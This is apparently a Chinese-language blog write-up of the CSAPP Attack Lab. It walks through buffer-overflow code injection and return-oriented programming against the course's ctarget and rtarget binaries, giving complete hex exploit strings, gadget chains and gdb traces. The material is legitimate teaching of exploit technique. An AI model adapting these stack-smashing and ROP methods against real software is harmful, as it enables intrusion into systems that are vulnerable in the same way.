---
layout: posts
title: CSAPP Attack Lab
date: 2022-12-16 22:13:20
categories: 编程
tags:
  - C
  - Assembly
  - 计算机体系结构
---

这个 lab 对应的是 CSAPP 中的 3.10 节，主要是缓冲区攻击，需要对栈帧结构、gdb 有一定了解。现在开搞！

<!--more-->

## 前置

首先有个函数`getbuf()`，这个是缓冲区攻击的重点。

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

可以看到有个栈上的数组`buf[BUFFER_SIZE]`，还有一个`Gets()`，作用相当于著名的`gets()`。由于`Gets()`不执行缓冲区检查，我们能够借助对`buf`的读入覆盖栈上其他部分(比如返回地址)，做出一些花活，这就是缓冲区攻击的原理。

在这个 lab 中，我们需要用不同方法发起缓冲区攻击，以恰当的参数调用三个函数：`touch1()`、`touch2()`、`touch3()`。这个 lab 大体提供了两种方式：代码注入、面向 return 编程(ROP)。下文会细 🔒。

在开搞之前，回顾一下栈帧结构：
![](/2022/12/16/CSAPP-Attack-Lab/image/stack_frame.png)

在返回时，%rsp 指向返回地址，然后将其弹出，并将程序计数器 PC 设置成这个返回地址。我们主要在这里做文章。

值得注意的是，每一份作业都给了一个独一无二的 cookie，后面会用到。(我的是`0x59b997fa`)

## 第一部分 代码注入

这个是本 lab 第一部分的任务。在这一部分里，栈地址没有随机化，对于攻击来说刚刚好。这一部分对应的二进制程序是`./ctarget`。

首先有个函数`test()`作为入口：

```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val); // normal result
}
```

正常情况下，函数会执行到那行`printf`，而我们的任务是不让它走这条路，而是执行别的函数。

### 1. touch1()

我们要执行的函数如下：

```c
void touch1() {
    // ...
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

只要触发就算赢！我们直接看`touch1()`的汇编：

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  ...
```

可以看到`touch1()`的地址是`0x4017c0`。

接下来要决定这个地址放在哪里，所以我们看一下`getbuf()`的汇编，看看它栈空间开了多大：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

开了 40 字节。因此，我们把地址放到 40~48 字节处，如下：

```
64 64 64 64 64 64 64 64 # useless bytes(5 * 8)
64 64 64 64 64 64 64 64
64 64 64 64 64 64 64 64
64 64 64 64 64 64 64 64
65 65 65 65 65 65 65 65

c0 17 40 00 00 00 00 00 # address
```

为了查看效果，我们开一下 gdb:

```
(gdb) b * 0x4017a8
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) b * 0x4017b9
Breakpoint 2 at 0x4017b9: file buf.c, line 16.
(gdb) run -q < <(./hex2raw < exploit_c1.txt)
Starting program: /home/asterich/code/labs/csapp/3-attack/ctarget -q < <(./hex2raw < exploit_c1.txt)
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.
(gdb) continue
Continuing.

Breakpoint 2, 0x00000000004017b9 in getbuf () at buf.c:16
16      in buf.c
(gdb) print /x $rsp
$1 = 0x5561dc78
(gdb) x/6g 0x5561dc78
0x5561dc78:     0x6464646464646464      0x6464646464646464
0x5561dc88:     0x6464646464646464      0x6464646464646464
0x5561dc98:     0x6565656565656565      0x00000000004017c0
```

可以看到，地址`(%rsp + 0x28)`处变成了我们的形状。接下来继续执行：

```
(gdb) stepi
0x00000000004017bd      16      in buf.c
(gdb) print /x *(long long *) ($rsp)
$7 = 0x4017c0
```

`ret`之后，%rsp 来到了我们想要的地方。继续执行：

```
(gdb) stepi
touch1 () at visible.c:25
```

赢！

### 2. touch2()

`touch2()`有些不一样，它对参数有些要求：

```c
void touch2(unsigned val) {
    // ...
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

这要求我们注入一些代码，把我们拿到的 cookie 赋给参数 val(即寄存器%rdi)。有一条 mov 指令是肯定的，关键在于怎么先跳到注入代码再跳到`touch2()`。这里的正常做法应该是 mov 完了之后把`touch2()`的地址入栈，如下(转自[https://zhuanlan.zhihu.com/p/60724948]())：

```
48 c7 c7 <cookie>         # mov    <cookie>,%rdi
68 ec 17 40 00            # pushq  $0x4017ec
c3                        # retq

...

78 dc 61 55 00 00 00 00   # 注入代码的地址
```

然而我的做法比较逆天：

```
bf 97 dc 61 55            # mov $0x5561dc97, %edi
48 83 ec 30               # sub $0x20, %rsp
c3                        # retq
90 90 90 90 90 90

ec 17 40 00 00 00 00 00   # touch2()

...

78 dc 61 55 00 00 00 00   # 注入代码的地址
```

大概就是直接操控%rsp，让它直接指向`touch2()`。

把 gdb 贴出来(地址`0x5561dc7d`对应的是`sub $0x20, %rsp`)：

```
Breakpoint 1, getbuf () at buf.c:12
12      in buf.c
(gdb) continue
Continuing.

Breakpoint 2, 0x00000000004017b9 in getbuf () at buf.c:16
16      in buf.c
(gdb) x/6g $rsp
0x5561dc78:     0xec834859b997fabf      0x909090909090c320
0x5561dc88:     0x00000000004017ec      0x6464646464646464
0x5561dc98:     0x6565656565656565      0x000000005561dc78
(gdb) stepi
0x00000000004017bd      16      in buf.c
(gdb) stepi
0x000000005561dc78 in ?? ()
(gdb) x/6g $rsp
0x5561dca8:     0x0000000000000000      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) stepi
0x000000005561dc7d in ?? ()
(gdb) x/6g $rsp
0x5561dca8:     0x0000000000000000      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) stepi
0x000000005561dc81 in ?? ()
(gdb) x/6g $rsp
0x5561dc88:     0x00000000004017ec      0x6464646464646464
0x5561dc98:     0x6565656565656565      0x000000005561dc78
0x5561dca8:     0x0000000000000000      0x0000000000401f24
(gdb) print /x ($edi)
$9 = 0x59b997fa
(gdb) stepi
touch2 (val=1505335290) at visible.c:40
40      visible.c: No such file or directory.
```

也行。

最终答案：

```
bf fa 97 b9 59 48 83 ec 20 c3 90 90 90 90 90 90 ec 17 40 00 00 00 00 00
64 64 64 64 64 64 64 64 65 65 65 65 65 65 65 65 78 dc 61 55 00 00 00 00
```

### 3. touch3()

看看`touch3()`：

```c
void touch3(char *sval) {
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

`touch3()`的参数是一个字符串。在`touch3()`中，参数的字符串会和 cookie 转化成的字符串用`hexmatch()`比较，所以我们需要开两块地方，一个存放 cookie 字符串本身，一个存放字符串的地址。

我们再看看`hexmatch()`：

```c
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

显然，它可能会覆盖原先`getbuf()`缓冲区的数据，所以把它放在哪里也是需要考虑的地方。最安全的做法应该是放在原先的返回地址后面。其他的同`touch2()`。

最终答案：

```
bf a8 dc 61 55 48 83 ec 20 c3 90 90 90 90 90 90 fa 18 40 00 00 00 00 00
64 64 64 64 64 64 64 35 39 62 39 39 37 66 61 00 78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

## 第二部分 Return-Oriented Programming

为了防止直球代码注入，人们发明出了一些解决方法，例如以下两种：

- 随机化：函数的栈帧地址随机分配，每次运行都不一样
- 栈帧被标记为不可执行的

不幸的是，我们的新程序`./rtarget`运用了这些技术。

道高一尺魔高一丈，ROP 应运而生。

ROP 这种叫法很有趣，大概是在栈中连续放入一些工具(gadget)的地址，这样就能通过`ret`指令一路跳下去。给个生动形象的图：

![](/2022/12/16/CSAPP-Attack-Lab/image/rop.png)

gadget 一般源于二进制程序中已有的片段或者其链接的库。

举个例子，看看 lab 中`farm.c`的一个函数：

```c
void setval_210(unsigned *p) {
    *p = 3347663060U;
}
```

机器码：

```
400f15:    c7 07 d4 48 89 c7     # movl $0xc78948d4,(%rdi)
400f1b:    c3                    # retq
```

注意到里面有个序列`48 89 c7`，解码后刚好是汇编`movq %rax, %rdi`。这意味着我们找到了一个起始地址为`0x400f18`、指令为`movq %rax, %rdi`的 gadget。

在接下来的任务中，我们要从`farm.c`中找 gadget，并且放到栈中适当位置。

### 1. touch2()

这里同样要求我们触发`touch2()`并且传入正确的参数。我们对照 lab 任务书的指令编码表格，在反汇编后`farm.c`的前半部分中查找可能有用的 gadget(已经用注释标出来)：

```asm
000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq

; mov %rax, %rdi
; ret
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq

; popq %rax
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq

; mov %rax, %rdi
; nop
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq

; popq %rax
; nop
; ret (near)
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq

```

我们找到`popq %rax`(`0x4019ab`)和`mov %rax, %rdi`(`0x4019a2`)这种相当有用的指令，因此把栈做如下编排：

```
...                           # 40 useless bytes
ab 19 40 00 00 00 00 00       # popq %rax
fa 97 b9 59 00 00 00 00       # cookie
a2 19 40 00 00 00 00 00       # mov %rax, %rdi
ec 17 40 00 00 00 00 00       # touch2()
```

### 2. touch3()

最初打算直接使用%rsp 来充当字符串的地址，但是这样的话实在没有合适的指令让%rsp 往下跳……看了亿眼别人的答案，才发现可以让%rsp 加上一个偏移量，寄寄寄（

偏移量怎么加呢？我们看看`farm.c`(只截取有用的 gadget)：

```asm
; mov %rax, %rdi
; nop
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq

; performs "%rax = %rdi + %rsi"
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq

; mov %rsp, %rax
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq

; mov %ecx, %esi
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq

; mov %ecx, %esi
0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq

; mov %edx, %ecx
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq

; mov %esp, %eax
0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq

; mov %eax, %edx
; testb
0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq

; mov %edx, %ecx
; orb %bl
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq

; mov %rsp, %rax
; but it can't be used
0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq

; mov %rsp, %rax
0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq

```

我们发现有一个特别的函数`add_xy()`可以直接把`%rdi`和`%rsi`相加，放到`%rax`上；我们还发现有几个寄存器可供我们倒腾：`%ecx`、`%edx`、`%rsi`、`%rdi`、`%rax`。

我们先写出一个骨架：

```asm
; calculate offset
...
; after that, the offset is put in %rax

; put offset into %rsi
mov %eax, %edx
mov %edx, %ecx
mov %ecx, %esi

; main
mov %rsp, %rax
mov %rax, %rdi
add_xy()
mov %rax, %rdi
call touch3()
<cookie string>

```

在这里，偏移量显然是`mov %rsp, %rax`和`<cookie string>`的距离，但是中间其实还可以填充一些相当于`nop`的东西。我们还发现，`getbuf()`的返回值是 1，这表明`%rax`在攻击开始时一定是 1。

我的做法还是比较逆天：不断倍增这个 1。结果相当长。

倍增是这样的(`%rax -> %rdx -> %rcx -> %rsi, %rax -> %rdi, add_xy()`)：

```asm
mov %eax, %edx
mov %edx, %ecx
mov %ecx, %esi
mov %rax, %rdi
add_xy()
```

如果是倍增，最后的偏移量需要是$2^n$，可能需要填充一些相当于`nop`的指令。不过这里不需要。

最终结果：

```
# useless bytes (40 bytes)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
64 64 64 64 64 64 64 64
65 65 65 65 65 65 65 65

# double(x5)
42 1a 40 00 00 00 00 00  # mov %eax, %edx
34 1a 40 00 00 00 00 00  # mov %edx, %ecx
27 1a 40 00 00 00 00 00  # mov %ecx, %esi
c5 19 40 00 00 00 00 00  # mov %rax, %rdi
d6 19 40 00 00 00 00 00  # add_xy()

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

# main
42 1a 40 00 00 00 00 00  # mov %eax, %edx
34 1a 40 00 00 00 00 00  # mov %edx, %ecx
27 1a 40 00 00 00 00 00  # mov %ecx, %esi
ad 1a 40 00 00 00 00 00  # mov %rsp, %rax
c5 19 40 00 00 00 00 00  # mov %rax, %rdi
d6 19 40 00 00 00 00 00  # add_xy()
c5 19 40 00 00 00 00 00  # mov %rax, %rdi
fa 18 40 00 00 00 00 00  # call touch3()
35 39 62 39 39 37 66 61  # <cookie string>
00 00 00 00 00 00 00 00
```

## 总结

太好玩辣！

![](/2022/12/16/CSAPP-Attack-Lab/image/%E5%B1%80%E5%BA%A7.jpg)
